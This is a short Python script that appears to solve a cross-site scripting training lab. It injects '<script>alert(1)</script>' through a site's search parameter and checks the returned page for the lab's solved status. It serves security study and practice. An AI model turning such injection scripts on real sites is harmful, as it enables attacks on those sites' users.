# Lab: Reflected XSS into HTML context with nothing encoded

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip()
    except Exception:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

exploit_payload = "<script>alert(1)</script>"

crafted_request = requests.get(base_url + "/?search=%s" % exploit_payload)

response = crafted_request.text
data = []
soup = BeautifulSoup(response, features="lxml")
data = soup.find("div", {"class" : "widgetcontainer-lab-status is-notsolved"})

if data is not None:
    print("Not Solved! :( \n")
else:
    print("Solved!!! :) \n")
